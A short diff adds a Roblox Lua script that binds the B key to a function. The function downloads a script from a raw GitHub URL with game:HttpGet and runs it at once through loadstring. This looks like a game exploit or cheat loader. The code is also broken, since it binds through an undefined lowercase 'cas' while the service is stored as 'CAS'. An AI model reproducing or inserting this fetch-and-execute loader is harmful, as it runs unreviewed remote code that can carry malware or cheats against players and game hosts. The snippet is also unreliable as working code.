@@ -1,0 +1,9 @@
+local UIS = game:GetService('UserInputService')
+local CAS = game:GetService("ContextActionService")
+
+function onTOGGLER()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xalcohol/testREPOS/refs/heads/main/autRcheck"))()
+    print("Enabled")
+end    
+    
+cas:BindAction("Toggle", onTOGGLER, false, Enum.KeyCode.B)
